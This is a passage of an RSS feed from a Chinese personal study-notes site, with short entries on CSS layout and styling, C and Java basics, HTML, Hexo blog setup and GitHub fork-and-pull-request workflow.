      <description>修改网页滚动条样式 属性描述 /* 整个滚动条*/ ::-webkit-scrollbar { }  /* 滚动条两端的按钮 */ ::-webkit-scrollbar-button { }  /* 滚动条的滚动轨道 */ ::-webkit-scrollbar-track { }  /* 内层轨道 */ ::-webkit-scrollbar-track-piece { }  /* 滑块 */ ::-webkit-scrollbar-thumb { }  /* 边角 */ ::-webkit-scrollbar-corner { }  /* 右下角拖动块的样式 */ ::-webkit-resizer { } 使用 一般我们这样设置这几个主要属性就 OK 了。
/*定义整个滚动条高宽及背景：高宽分别对应横竖滚动条的尺寸*/ ::-webkit-scrollbar { 	width: 10px; 	background-color: #f5f5f5; } /*定义滚动条轨道：内阴影 + 圆角*/ ::-webkit-scrollbar-track { 	background-color: #f5f5f5; } /*定义滑块：内阴影 + 圆角*/ ::-webkit-scrollbar-thumb { 	border-radius: 10px; 	background-color: #555; } 更多相关属性 :horizontal //水平方向的滚动条 :vertical //垂直 方向的滚动条 :decrement //应用于按钮和内层轨道(track piece)。它用来指示按钮或者内层轨道是否会减小视窗的位置(比如，垂直滚动条的上面，水平滚动条的左边。) :increment //decrement类似，用来指示按钮或内层轨道是否会增大视窗的位置(比如，垂直滚动条的下面和水平滚动条的右边。) :start //伪类也应用于按钮和滑块。它用来定义对象是否放到滑块的前面。 :end //类似于start伪类，标识对象是否放到滑块的后面。 :double-button //该伪类以用于按钮和内层轨道。用于判断一个按钮是不是放在滚动条同一端的一对按钮中的一个。对于内层轨道来说，它表示内层轨道是否紧靠一对按钮。 :single-button //类似于double-button伪类。对按钮来说，它用于判断一个按钮是否自己独立的在滚动条的一段。对内层轨道来说，它表示内层轨道是否紧靠一个single-button。 :no-button //用于内层轨道，表示内层轨道是否要滚动到滚动条的终端，比如，滚动条两端没有按钮的时候。 :corner-present //用于所有滚动条轨道，指示滚动条圆角是否显示。 :window-inactive //用于所有的滚动条轨道，指示应用滚动条的某个页面容器(元素)是否当前被激活。 </description>
    </item>
    
    <item>
      <title>Css Body 背景图</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/body-%E8%83%8C%E6%99%AF%E5%9B%BE/</link>
      <pubDate>Sat, 09 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/body-%E8%83%8C%E6%99%AF%E5%9B%BE/</guid>
      <description>Body 背景图 画布 它是一块区域，也叫视口（可视窗口）。
它的最小宽度为视口宽度，最小高度为视口高度。
Html 的背景图 该元素的背景覆盖画布。即给该元素设置背景，相当于设置画布的背景。
Body 的背景图 若根元素有背景，body 元素的背景正常显示。
若根元素没有设置背景，则 body 元素的背景覆盖画布，则会出现不正常的现象，原因为若没有这个规则，就无法给整个网页设置背景。
背景图覆盖画布时 高度：纵向位置百分比、预设值，相对于根元素高度。
宽度：横向位置百分比、预设值，相对于视口。</description>
    </item>
    
    <item>
      <title>Css keyframes</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/keyframes/</link>
      <pubDate>Sat, 09 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/keyframes/</guid>
      <description>Css keyframes 持续旋转 选中文档中的元素。
.map2 { 	width: 8.0375rem; 	height: 8.0375rem; 	background-image: url(../images/lbx.png); 	opacity: 0.6; 	animation: rotate 15s linear infinite; 	z-index: 2; } keyframes @keyframes rotate { 	/* 从 0° 开始旋转 */ 	from { 	transform: translate(-50%, -50%) rotate(0deg); 	} 	/* 旋转到 360 ° */ 	to { 	transform: translate(-50%, -50%) rotate(360deg); 	} } </description>
    </item>
    
    <item>
      <title>italic 和 oblique</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/italic-%E5%92%8C-oblique/</link>
      <pubDate>Sat, 09 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/italic-%E5%92%8C-oblique/</guid>
      <description>italic 和 oblique italic：浏览器会显示一个斜体的字体样式。
oblique：浏览器会显示一个倾斜的字体样式。
可以发现关键之处为斜体和倾斜。
Italic 是使用了文字本身的斜体属性，
oblique 是让没有斜体属性的文字做倾斜处理。
因为有少量的不常用字体没有斜体的属性，
如果我们使用 Italic 就会没有效果，只能 Oblique 使用才能使文字倾斜。</description>
    </item>
    
    <item>
      <title>Css 语法</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E8%AF%AD%E6%B3%95/</link>
      <pubDate>Fri, 08 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E8%AF%AD%E6%B3%95/</guid>
      <description>语法 CSS 的语法通常是一个选择器，用于选择 HTML 文档中的元素。
选择器：位于语法开始，用于选中 HTML 文档中的元素。
声明：以 { 开始，以 } 结束。{ 与 } 必须成对出现。
声明块：由属性与属性值组成。
.selector { 	color: #000; } 使用 内联式：将 CSS 语法书写到元素的 style 属性中，仅对当前元素生效，也叫行内式。
内嵌式：首先将 style 元素书写到 head 元素中，然后将 CSS 语法书写到 style 元素中，也叫内部样式表。
外链式：将 CSS 语法书写到独立的 CSS 文件中，并在 HTML 文档中使用 link 元素引入，也叫外部样式表。
优先级：内联式 &amp;gt; 内嵌式 &amp;gt; 外链式。</description>
    </item>
    
    <item>
      <title>Css 块格式化上下文</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E5%9D%97%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%8A%E4%B8%8B%E6%96%87/</link>
      <pubDate>Thu, 07 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E5%9D%97%E6%A0%BC%E5%BC%8F%E5%8C%96%E4%B8%8A%E4%B8%8B%E6%96%87/</guid>
      <description>块格式化上下文 格式化上下文（Block Formatting Context），它是一块 独立的渲染区域，它规定了在该区域中，普通流块盒的布局。
触发 BFC 的元素  根元素 html，该元素创建的 BFC 覆盖了文档中的所有元素。 浮动元素，float 的值不为 none 的元素。 绝对定位元素，position 的值为 absolute 或 fixed 的元素。 overflow 的值不为 visible 的块盒。 行块盒，display 的值为 inline-block 的元素。 表格单元格，display 的值为 table-cell 的元素，表格单元格默认为该值。 表格标题，display 的值为 table-caption 的元素，表格标题默认为该值。  正常布局流块盒的渲染区域  每个块盒都会参与块格式化上下文的创建。 不同的 BFC，它们进行渲染时互不干扰。 创建 BFC 的元素，隔绝了它内部和外部的联系，内部的渲染不会影响到外部区域。 创建 BFC 的元素，它的所有内容都会被包含在它所创建的 BFC 中  BFC 的作用 解决高度塌陷
创建 BFC 的元素，它的自动高度会计算浮动元素；若只是为了创建 BFC 一般使用副作用最小的方式：设置块盒的 overflow 的属性值为 hidden。仅仅是为了解决高度坍塌，建议使用伪元素 after。
原理：因为它要隔绝内部与外部的关系，而高度坍塌会使元素不在其包含块内，所以它的自动高度必须计算浮动元素，因此创建 BFC 可以解决高度坍塌的问题。
解决浮动流脱离文档流</description>
    </item>
    
    <item>
      <title>Css 画三角形</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E7%94%BB%E4%B8%89%E8%A7%92%E5%BD%A2/</link>
      <pubDate>Thu, 07 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E7%94%BB%E4%B8%89%E8%A7%92%E5%BD%A2/</guid>
      <description>画三角形 .triangle { 	width: 0; 	height: 0; 	border-width: 50px; 	border-style: solid; 	display: inline-block; 	border-color: transparent transparent #008c8c transparent; } </description>
    </item>
    
    <item>
      <title>Css 盒子模型</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/</link>
      <pubDate>Wed, 06 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/</guid>
      <description>盒子模型 前言 在 CSS 中，每一个元素都可以看作是一个盒子，这个盒子由以下几个方面组成。目前常用的有两种盒模型，分别是标准盒模型和怪异盒模型。
一个盒子的组成  内容（content） 内边距（padding） 边框（border） 外边距（margin）  标准盒模型 box-sizing 的值为 content-box 的元素；且浏览器将采用标准模式解析。
盒子总宽度 = width + padding（左右）+ border（左右）+ margin（左右）。
盒子总高度 = height + padding（上下）+ border（上下）+ margin（上下。
怪异盒模型 box-sizing 的值为 border-box 的元素；且浏览器将采用怪异模式（兼容模式）解析，也叫 IE 盒模型。
盒子总宽度 = width + margin（左右），其 width 包含了 padding（左右）和 border（左右）的宽度。
盒子总高度 = width + margin（上下），其 height 包含了 padding（上下）和 border（上下）的高度。</description>
    </item>
    
    <item>
      <title>Css 层叠上下文</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E5%B1%82%E5%8F%A0%E4%B8%8A%E4%B8%8B%E6%96%87/</link>
      <pubDate>Tue, 05 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E5%B1%82%E5%8F%A0%E4%B8%8A%E4%B8%8B%E6%96%87/</guid>
      <description>层叠上下文 它是一块区域，它由某个元素创建，它规定了该区域中的内容在 Z 轴上排列的先后顺序。
它是一种 三维概念。所有的 HTML 元素都根据其元素的属性按照优先级顺序占据这个空间。
规则 只有定位元素设置 z-index 有效。
设置 z-index 值为负数的元素，会被正常流、浮动流覆盖。
z-index 的值，该值越大，则越靠近用户。
所有元素都处于 html 元素的层叠上下文中。
如遇到 z-index 一样的层叠上下文，则比较元素的书写顺序。
层叠上下文的元素，它本身永远被父级包含内，哪怕该元素设置了 z-index:-9999，它也只能包含于自身父元素的层叠上下文中。
每一个层叠上下文的元素，它们都完全独立于同级的元素，当处理层叠上下文时只会考虑自己的子元素。
创建层叠上下文的元素  根元素（html）。 Position 值为 absolute 或 relative 且 z-index 值不为 auto 的元素。 Opacity 的值小于 1 的元素。  优先级  同一个层叠上下文中，元素从底部到顶部的优先级 创建层叠上下文元素的背景和边框。 z-index 的值为负的层叠上下文元素。 常规流非定位元素的块盒。 非定位的浮动流。 常规流非定位行盒。 任何 z-index 属性值为 auto 的定位子元素，以及 z-index 为 0 的元素。 z-index 的值为正的元素。  </description>
    </item>
    
    <item>
      <title>爽文的价值</title>
      <link>https://note.yxzi.xyz/note/view/read/%E7%88%BD%E6%96%87%E7%9A%84%E4%BB%B7%E5%80%BC/</link>
      <pubDate>Tue, 05 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/view/read/%E7%88%BD%E6%96%87%E7%9A%84%E4%BB%B7%E5%80%BC/</guid>
      <description>爽文的价值 一部爽文的套路，如果我们把它的背景换一下，那么完全可以构造出不同的观感。
假如更加彻底的改动，但是保留套路呢？
能不能摇身一变，变成严肃文学？</description>
    </item>
    
    <item>
      <title>Css 层叠</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E5%B1%82%E5%8F%A0/</link>
      <pubDate>Mon, 04 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E5%B1%82%E5%8F%A0/</guid>
      <description>层叠 层叠是 CSS 的一个基本特征，浏览器通过 优先级 来判断哪些属性值对一个元素最为重要，从而在这个元素上应用这些属性值。
确定声明值 找出样式表中没有冲突的声明，并应用到 CSS 属性，样式声明不冲突则不会发生层叠。
层叠 对样式表中有冲突（同一个元素在样式表中设置了多个相同的属性）的声明使用层叠规则。
比较重要性
 重要性由高到低为 样式表中的 !imliortant 样式（尽量不使用）。 样式表中的普通样式（内联式 &amp;gt; 内嵌式 &amp;gt; 外链式）。 浏览器中的默认样式。  比较优先级
 选择器选中的范围越窄，优先级越高。 通过选择器，计算出一个四位数（xxxx），该四位数越大越则优先级越高。这个四位数的进制为逢 256 进一。 :nth-child()选择器会覆盖:hover选择器  四位数的取值
  千位：内联样式，记作 1，否则记为 0。
  百位：所有 id 选择器的数量。
  十位：所有类选择器、属性选择器、伪类选择器的数量。
  个位：元素选择器、伪元素选择器的数量。
  零：通配符选择器。
  比较源次序
CSS 样式书写靠后的属性最终会应用到元素。
继承 使用继承，对仍然没有值的属性，若可以继承（部分属性是不能继承的，通常情况下，只有跟文字内容有关的属性可以被继承。），则继承其父元素的属性。
当元素的属性有默认值时，该元素一般不会继承父元素的属性。
使用默认值 每个 CSS 在属性都会有默认值，当继承结束后，对于仍然没有值的属性，会使用默认值。</description>
    </item>
    
    <item>
      <title>C break</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/break/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E6%B5%81%E7%A8%8B%E6%8E%A7%E5%88%B6/break/</guid>
      <description>break 用于终止循环或退出 switch.
不能直接用于 if，除非 if 是循环的一个子句。</description>
    </item>
    
    <item>
      <title>C 自增与自减</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/%E8%87%AA%E5%A2%9E%E4%B8%8E%E8%87%AA%E5%87%8F/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/%E8%87%AA%E5%A2%9E%E4%B8%8E%E8%87%AA%E5%87%8F/</guid>
      <description>自增与自减 前自增++i与后自增 i++.
异同 相同
最终都会使 i 的值加 1.
不同
i++返回原来的值，
++i返回加 1 后的值。
#include &amp;lt;stdio.h&amp;gt; int main() {  int a,b,c,d;  a = b = 3;  // return 3  c = a++;  // return 4  d = ++b;  printf(&amp;#34;c = %d\nd = %d&amp;#34;,c,d);  return 0; } </description>
    </item>
    
    <item>
      <title>C 预备知识</title>
      <link>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/c/%E5%9F%BA%E7%A1%80/%E9%A2%84%E5%A4%87%E7%9F%A5%E8%AF%86/</guid>
      <description>预备知识 六大硬件的关系 双击（操作系统给用户提供的一个操作）打开一个存放在硬盘中的视频。
因为 CPU 并不能直接处理硬盘上的数据，所以会将硬盘上的视频数据拷贝到内存中。
CPU 再对内存中的数据进行处理。
因为 CPU、内存、显卡（控制显示器的正确显示）、硬盘都是安装在主板上的，因此主板是一个组织它们如何有效运行的硬件。
程序是如何运行的 编译 —— 建立链接（生成一个格式为 exe 的可执行文件）—— 调用操作系统，操作系统再调用 CPU 并执行这个 exe 文件，最后会在显示器上看到这个软件的运行结果 。
软件不能直接控制硬件。
什么是变量 变量的本质是将一个空闲的内存空间与某个变量产生联系。
int a; //调用操作系统在内存条中创建一个空的内存空间，并将变量 a 自动分配到该内存空间中，使得变量 a 与该内存空间的地址编号产生一个一一对应的关系 a = 3; //将 3 放入变量 a 的内存空间内。  软件运行与内存的关系 一个软件在运行前需要请求操作系统将硬盘中的数据拷贝到内存中，并使用 CPU 启动该软件。
一个软件运行时，它所占的储存空间不会再分配给其他程序使用。
当软件运行完毕后，操作系统将释放该储存空间，（但操作系统并不会清空该内存空间中软件残留下来的数据，所以下次使用该内存空间时，很可能该内存空间中存在着其他软件所残留的垃圾数据。），以便再次分配给其他软件使用。
常量的表示 整数。 八进制：前面加 0 ，018。
十进制：传统写法，18。
十六进制：前面加 0x 或 0X，0x18。
浮点数。 传统写法，1.8。
科学计数法，1.8e2（1.8 * 10 的 2 次方）。
字符 单个字符用单引号括起来，&amp;lsquo;Y&amp;rsquo;。
多个字符或单个字符都可以用双引号括起来，所有的字符串都会在末尾添加 \0（结束符），&amp;ldquo;Y\0&amp;rdquo;。
常量是怎么存储在计算机中的 整数是以补码的形式转换为二进制储存在计算机中。</description>
    </item>
    
    <item>
      <title>Css 布局</title>
      <link>https://note.yxzi.xyz/note/technology/language/css/%E5%B8%83%E5%B1%80/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/css/%E5%B8%83%E5%B1%80/</guid>
      <description>布局 正常流布局  默认情况下，所有元素都属于正常流。 块盒独占一行。 行盒水平依次排列。 包含块：每个盒子都有它的包含块，包含块决定了该盒子的排列范围。 在正常布局流中，元素的包含块，都是该元素父元素的内容盒。  margin 合并 多个同级且相邻的正常布局流块盒，当它们的上下margin相邻，则会合并为一个margin。
 两个外边距值都是正数，则取较大值； 两个值都是负数，则取较大值； 一正一负则取两个值的和，  该情况可以触发 BFC 解决。
margin 塌陷 正常布局流中的呈父子关系的块盒，如果父元素没有设置上下内边距或上下边框，则子元素的上下margin就会和父元素的上下margin重合，且这时如果设置子元素的上下margin，相当于设置父元素的margin。
该情况可以触发 BFC 解决。
浮动流布局  使元素向左上或向右上排列。 通常情况，浮动元素会无视正常布局元素，它会将正常布局元素覆盖。 在一行浮动元素中，若父元素装不下所有的浮动元素，则多余的浮动元素会自动向下移动，直到具备足够的空间能容纳这些多余的浮动元素，才向左或向右移动。 行盒在排列时，默认会避开浮动元素（单独的文字也是行盒，因为浏览器会自动生成一个行盒包裹单独的文字，该行盒为匿名行盒）。 浮动元素一定是块盒。 不会发生 margin 合并。 脱离正常布局流。  高度塌陷 正常布局流元素高度自适应，它的子元素浮动后，该元素在计算高度时，不会考虑浮动后的子元素的高度，则会导致该元素高度为 0，这种情况称为高度塌陷。
解决：
利用伪元素 after 清除浮动即可解决。
定位流布局 使一个元素从它原本在正常布局流中应该在的位置移动到另一个位置。
相对定位   使元素在原来位置上进行偏移；若没有设置偏移量，对元素本身没有任何影响。
  提升元素层级（z-index）。
  盒子的偏移不会对其他盒子造成任何影响。
  脱离正常布局流。
  尽管元素被偏移了，但它仍然占据着它没偏移前的空间。
  绝对定位   它相对于 static 定位以外的第一个父元素进行定位；若没有，则它的包含块为整个网页（初始化包含块），原位置不会被保留。</description>
    </item>
    
    <item>
      <title>Github</title>
      <link>https://note.yxzi.xyz/note/technology/git/github/github/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/github/github/</guid>
      <description>Github Github 不但可以是一个个人的免费仓库，它还是一个开源协作社区，通过 GitHub ，既可以让别人参与你的开源项目，也可以参与别人的开源项目。
参与一个的开源项目 克隆他人的开源项目 访问该项目的主页。
点击Fork先克隆这个的项目到自己的远程仓库中。
使用git clone将这个项目从自己的远程仓库中clone到本地。
git clone git@github.com:YxzRainy/YxzRainy.github.io.git 一定要从自己的账号下 clone 仓库，这样你才能推送修改。如果从别人的仓库地址克隆，你将不能推送修改，因为你没有权限。
如果你想修复这个开源的一个 bug，或者新增一个功能，立刻就可以开始干活，干完后，往自己的仓库推送。</description>
    </item>
    
    <item>
      <title>Hexo 将博客作为站点子页面</title>
      <link>https://note.yxzi.xyz/note/technology/frame/hexo/%E5%B0%86%E5%8D%9A%E5%AE%A2%E4%BD%9C%E4%B8%BA%E7%AB%99%E7%82%B9%E5%AD%90%E9%A1%B5%E9%9D%A2/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/hexo/%E5%B0%86%E5%8D%9A%E5%AE%A2%E4%BD%9C%E4%B8%BA%E7%AB%99%E7%82%B9%E5%AD%90%E9%A1%B5%E9%9D%A2/</guid>
      <description>Hexo 将博客作为站点子页面 前言 如果你想如何在 GitHub 的 repository 中上传自己写的网页作为首页，hexo 生成的博客页作为其子页？即自己写的页面作为 UserName.github.io 的页面，将 hexo 博客放在 UserName.github.io/blog 上，那么，这个教程也许可以帮到你。
本教程的前提是你已经用 hexo 将博客搭建在 UserName.github.io 的仓库上了。
新建仓库 在 github 上新建一个仓库，名字随意，我的是 Blog。
然后本地初始化一个 master 分支，并且将原仓库 clone 到本地分支，并且 开启仓库的 GitHub Pages.，需要注意的是，这里的本地分支目前是没有 CNAME 文件 的。
修改 Hexo 的配置文件 打开配置文件 _config.yml，找到 #URL 下的 url 和 root，将 url 修改为https:// UesrName.github.io/新建的仓库名（我这里是 Blog），然后将 root 修改为**/新建的仓库名/**。
# URL ## Set your site url here. For example, if you use GitHub Page, set url as &amp;#39;https://username.</description>
    </item>
    
    <item>
      <title>Hexo 搭建博客</title>
      <link>https://note.yxzi.xyz/note/technology/frame/hexo/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/hexo/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</guid>
      <description>Hexo 搭建博客 创建 Github 仓库 注册一个Github账号 创建 Github Repository 在 Github 上创建一个仓库，仓库名必须为 UserName.github.io，注意，这是固定的写法 。
将 Git 与 Github 关联 下载并安装Git 配置个人信息 git config --global user.name &amp;#34;Your UserName&amp;#34; git config --global user.email &amp;#34;YourEmail@qq.com&amp;#34; 生成 ssh 密钥文件 hexo d 到远程仓库，因为每一台电脑中的私钥只有只有一个，因此当你想给另一个 github 账号配置博客时，必须重新生成公钥和私钥
ssh-keygen -t rsa -C &amp;#34;Your GitHub 的邮箱&amp;#34; 复制 id_rsa pub 文件中的密钥 三个回车，默认不需要设置密码，之后到所显示的路径中找到生成的 ssh 的文件夹中的 id_rsa pub 密钥，将其中内容全部复制
new SSH Key 打开你的 Github 的主页，点击头像，选择 Settings，再选择 SSH and GPG keys，找到 SSH keys，点击 New SSH Key，Title 为标题，任意填写，将刚刚复制的 id_rsa pub 文件中的密钥文本粘贴进去，最后 Add SSH key。</description>
    </item>
    
    <item>
      <title>Hexo 更改博客主题</title>
      <link>https://note.yxzi.xyz/note/technology/frame/hexo/%E6%9B%B4%E6%94%B9%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/frame/hexo/%E6%9B%B4%E6%94%B9%E5%8D%9A%E5%AE%A2%E4%B8%BB%E9%A2%98/</guid>
      <description>Hexo 更改博客主题 前言 配置完了 Hexo，你是否对自带的主题不满意呢？本篇文章将教你如何更改及美化 Hexo 主题。
下载主题 去 Hexo 的Hexo Themes下载一个你认为不错的主题。这里推荐 Next主题
更改基本站点信息 在你的博客根目录下打开**_config.yml**，将 Site 下的信息改为你自己的
# Site title: Rainy 的梦呓 subtitle: &amp;#39;至简&amp;#39; description: &amp;#39;My Blog And Note to sum up&amp;#39; keywords: Blog note author: Yxz language: zh-CN timezone: &amp;#39;Asia/Shanghai&amp;#39; 同时 记得将 URL 下的 url 改为你自己的站点地址
# URL ## Set your site url here. For example, if you use GitHub Page, set url as &amp;#39;https://username.github.io/project&amp;#39; url: https://YxzRainy.github.io/Blog 切换到 Next 主题 在你的博客根目录下打开**_config.</description>
    </item>
    
    <item>
      <title>HTML img 的常见问题</title>
      <link>https://note.yxzi.xyz/note/technology/language/html/img-%E7%9A%84%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/html/img-%E7%9A%84%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/</guid>
      <description>img 的常见问题 关于无法设置宽高 如果该元素的图像链接失效，则该元素的特性会与行盒一样，无法设置宽高；如果想要图像链接失效后仍具有宽高，可以将该元素设置为块盒或者行块盒。
关于图像底部的留白 当任何一个元素（例如 div）内包含行盒（例如 img）时，该 img 行盒就会在这个 div 元素的内部创建参考线，即这个 div 元素在没有设置下外边距的情况下，img 元素的基线（下外边距的底部）会与父元素的基线对齐（即留白部分就是 img 元素的下外边距），因此导致图像底部有留白。
解决方法：
 第一种是将父元素的字体大小设置为零，则父元素的内部就不会产生参考线。 第二种是将 img 元素设置为块盒，因此其父元素的内部就没有包含行盒，因此不会在其父元素内部产生参考线。  </description>
    </item>
    
    <item>
      <title>HTML 元素语义化</title>
      <link>https://note.yxzi.xyz/note/technology/language/html/%E5%85%83%E7%B4%A0%E8%AF%AD%E4%B9%89%E5%8C%96/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/html/%E5%85%83%E7%B4%A0%E8%AF%AD%E4%B9%89%E5%8C%96/</guid>
      <description>元素语义化 前言 在 HTML 5 中，新增了许多元素，这些不同的元素都有不同的含义，因此语义化指的是用最合理、最恰当的元素来标记网页内容，使得机器也可以知道页面中有哪些元素，比如，文章、标题、或是段落。
语义化的优点  使文档在没有 CSS 样式的条件下，也能很好地呈现出内容结构。 使文档结构变的清晰，更具可读性，且利于后期的代码维护。 方便其他设备解析（屏幕阅读器、盲人阅读器、移动设备等）。 有利于 SEO。  </description>
    </item>
    
    <item>
      <title>htm、html、shtml 后缀的区别</title>
      <link>https://note.yxzi.xyz/note/technology/language/html/htmhtmlshtml-%E5%90%8E%E7%BC%80%E7%9A%84%E5%8C%BA%E5%88%AB/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/html/htmhtmlshtml-%E5%90%8E%E7%BC%80%E7%9A%84%E5%8C%BA%E5%88%AB/</guid>
      <description>htm、html、shtml 后缀的区别 首先 htm、html、shtml 都是静态网页的后缀，三者也可以说都是只是扩展名不同，其他一样，都是静态的网页。
Htm 和 html 是完全静态的网页不通过服务器编译解释直接送出给浏览器读取的静态网页，以 htm 和 html 伪静态 Request 除外。
html、htm、shtml、shtm 均是静态 html 网页，都是网页文件后缀名不同的 html 网页扩展名。
htm html 与 htm 均是静态网页后缀名，网页文件没有区别与区分，html 与 htm 后缀网页后缀可以互换，对网页完全没有影响同时也没有区别。可以认为 html 与 htm 没有本质区别，只是两者适用于不同的运行环境（DOS 和 UNIX）之下。
shtml shtml 命名的网页文件里，使用了 ssi 的一些指令，就像 asp 中的指令，你可以在 SHTML 文件中写入 SSI 指令，当客户端访问这些 shtml 文件时，服务器端会把这些 SHTML 文件进行读取和解释，把 SHTML 文件中包含的 SSI 指令解释出来。</description>
    </item>
    
    <item>
      <title>Issus</title>
      <link>https://note.yxzi.xyz/note/technology/git/github/issus/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/github/issus/</guid>
      <description>Issus 你可以提出 issue，供看到这个问题的任何人参与解决、讨论这个 issue，当 issue 得到解决时，仓库的所有者与 issue 的所有者就可以将这个 issue 关闭了。</description>
    </item>
    
    <item>
      <title>Java 基础</title>
      <link>https://note.yxzi.xyz/note/technology/language/java/java-%E5%9F%BA%E7%A1%80/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/language/java/java-%E5%9F%BA%E7%A1%80/</guid>
      <description>基础 类、对象 、属性、封装 类可以理解成对象的集合。比如 class person，定义一个人物类，这是一个抽象的概念。
对象可以理解为类中的一个元素，比如利用 person 这个人物类 new 一个“小明”，这个小明，就是一个具体的东西。
赋予这个小明一些属性，比如眼睛，鼻子，身高，这就是这个对象的属性。
赋予小明会编程、会跳舞唱歌的能力，这些就是这个对象的方法，你可以利用（调用）这些方法，让小明这个对象帮你写代码、唱首歌或跳支舞。
至于封装，我的理解是将内部的代码封装起来，然后提供一个接口供我们访问。比如电脑主机的开机键就是一个接口，我们点击开机键，就是调用这个电脑的一个接口，至于开机的内部过程或操作细节由电脑自行完成，我们无法干涉。
至于继承，还不知道。
void 的作用 void 表示一个方法中没有 return 任何数据类型，如果方法中 return 了某种数据类型，那么 void 会被替换为这种数据类型。
void Show1() {  int a = 123; }  int Show2() {  int a = 123;  return a; } public、protected、default（什么都不写）、private，表示访问控制的权限
private void Show1() {  int a = 123; }  // 相当于 default int Show2() int Show2() {  int a = 123;  return a; } </description>
    </item>
    
    <item>
      <title>Pull Requests</title>
      <link>https://note.yxzi.xyz/note/technology/git/github/pull-requests/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/github/pull-requests/</guid>
      <description>Pull Requests 简单来说就是：我改进了你的代码，你拉回去看看吧
当你想改进一个别人的项目 ，或想为别人的项目做贡献时，你将要走以下几个流程
 Fork 别人的仓库，相当于拷贝一份，毕竟不可能有人让你直接修改他的原仓库的。 将拷贝过来的仓库clone到本地分支，做一些修复，比如git clone git@github.com:YxzRainy/YxzRainy.github.io.git。 改进完成后，你希望仓库所有者接受你的修改，那么你需要在 Github 上创建一个Pull Request给原仓库所有者，意思是请求原仓库所有者合并你的分支。 原仓库所有者审查你做的这些修复后，如果它同意的话，就会将你做的修改合并到他自己的项目中，这样你就为他的这个项目做了贡献。 到这一步，整个Pull Request的过程就结束了。  </description>
    </item>
    
    <item>
      <title>Repository</title>
      <link>https://note.yxzi.xyz/note/technology/git/github/repository/</link>
      <pubDate>Sun, 03 Oct 2021 00:00:00 +0000</pubDate>
      
      <guid>https://note.yxzi.xyz/note/technology/git/github/repository/</guid>
      <description>Repository 一个在 GitHub 的 repository 的地址路径一般由 **GitHub 的域名 + 仓库主人 + 仓库本身的名字 **组成，并且你可以通过这个地址访问一个已存在的公开库 。比如 https://github.com/YxzRainy/YxzRainy.github.io
